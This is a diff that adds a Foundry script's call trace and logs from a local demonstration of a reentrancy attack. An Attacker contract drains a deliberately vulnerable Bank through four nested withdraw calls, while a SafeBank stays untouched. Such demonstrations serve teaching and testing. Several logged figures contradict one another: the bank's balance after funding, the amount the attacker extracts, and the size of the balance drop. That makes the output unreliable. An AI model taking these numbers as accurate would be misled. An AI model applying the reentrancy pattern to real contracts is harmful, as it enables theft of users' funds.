@@ -1,0 +1,82 @@
+No files changed, compilation skipped
+Traces:
+  [1243045] DeployReentrancy::run()
+    ├─ [0] VM::startBroadcast()
+    │   └─ ← [Return]
+    ├─ [271910] → new Bank@0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
+    │   └─ ← [Return] 1358 bytes of code
+    ├─ [0] console::log("Bank (vulnerable) deployed at:", Bank: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [290417] → new SafeBank@0x34A1D3fff3958843C43aD80F30b94c510645C316
+    │   └─ ← [Return] 1340 bytes of code
+    ├─ [0] console::log("SafeBank deployed at:", SafeBank: [0x34A1D3fff3958843C43aD80F30b94c510645C316]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [22559] Bank::addBalance{value: 15000000000000000}()
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Funded vulnerable bank with:", 15000000000000000 [1.5e16]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Vulnerable bank balance now:", 79228162514279337593543950335 [7.922e28]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [22538] SafeBank::addBalance{value: 15000000000000000}()
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Funded SafeBank with:", 15000000000000000 [1.5e16]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("SafeBank balance now:", 15000000000000000 [1.5e16]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [413497] → new Attacker@0xBb2180ebd78ce97360503434eD37fcf4a1Df61c3
+    │   └─ ← [Return] 1831 bytes of code
+    ├─ [0] console::log("Attacker deployed at:", Attacker: [0xBb2180ebd78ce97360503434eD37fcf4a1Df61c3]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Calling attacker.attack() with seed:", 10000000000000000 [1e16]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [85896] Attacker::attack{value: 10000000000000000}()
+    │   ├─ [22559] Bank::addBalance{value: 10000000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─ [55373] Bank::withdraw()
+    │   │   ├─ [47512] Attacker::receive{value: 10000000000000000}()
+    │   │   │   ├─ [26336] Bank::withdraw()
+    │   │   │   │   ├─ [18475] Attacker::receive{value: 10000000000000000}()
+    │   │   │   │   │   ├─ [17199] Bank::withdraw()
+    │   │   │   │   │   │   ├─ [9338] Attacker::receive{value: 10000000000000000}()
+    │   │   │   │   │   │   │   ├─ [8062] Bank::withdraw()
+    │   │   │   │   │   │   │   │   ├─ [201] Attacker::receive{value: 10000000000000000}()
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attack complete.") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Vulnerable bank balance after attack:", 79228162514249337593543950335 [7.922e28]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("SafeBank balance (should be unchanged):", 15000000000000000 [1.5e16]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attacker contract balance (stolen funds):", 40000000000000000 [4e16]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+
+Script ran successfully.
+Gas used: 1244209
+
+== Logs ==
+  Bank (vulnerable) deployed at: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
+  SafeBank deployed at: 0x34A1D3fff3958843C43aD80F30b94c510645C316
+  Funded vulnerable bank with: 15000000000000000
+  Vulnerable bank balance now: 79228162514279337593543950335
+  Funded SafeBank with: 15000000000000000
+  SafeBank balance now: 15000000000000000
+  Attacker deployed at: 0xBb2180ebd78ce97360503434eD37fcf4a1Df61c3
+  Calling attacker.attack() with seed: 10000000000000000
+  Attack complete.
+  Vulnerable bank balance after attack: 79228162514249337593543950335
+  SafeBank balance (should be unchanged): 15000000000000000
+  Attacker contract balance (stolen funds): 40000000000000000
+
+If you wish to simulate on-chain transactions pass a RPC URL.
